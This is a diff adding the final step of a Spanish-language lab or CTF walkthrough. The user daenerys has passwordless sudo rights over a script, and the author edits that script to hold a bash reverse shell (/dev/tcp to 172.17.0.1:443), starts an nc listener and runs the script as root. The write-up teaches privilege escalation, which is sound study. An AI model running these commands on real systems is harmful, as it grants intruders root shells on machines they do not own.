@@ -257,5 +257,27 @@ Se puede ver ya desde el usuario daenerys:
 
 <img width="742" height="136" alt="imagen" src="https://github.com/user-attachments/assets/af17b253-c81c-4448-a15a-1f89a37bfacc" />
 
-Además si probamos `sudo -l` nos lleva a ese script también:
+Además si probamos `sudo -l` nos lleva a ese script también.
 
+Esto significa que Daenerys puede ejecutar ese script como cualquier usuario, incluido root, sin contraseña. Por tanto si ejecutamos esa reverse shell y recibimos la conexión, seremos root:
+```bash
+nano /home/daenerys/.secret/.shell.sh
+
+bash -i >& /dev/tcp/172.17.0.1/443 0>&1
+```
+
+En otra sesión:
+```bash
+nc -lnvp 443
+```
+
+Ejecutar:
+```bash
+sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
+```
+
+Somos root:
+
+<img width="670" height="184" alt="imagen" src="https://github.com/user-attachments/assets/88e3be2d-da94-478e-9362-27d6b462401c" />
+
+Hemos completado la máquina!
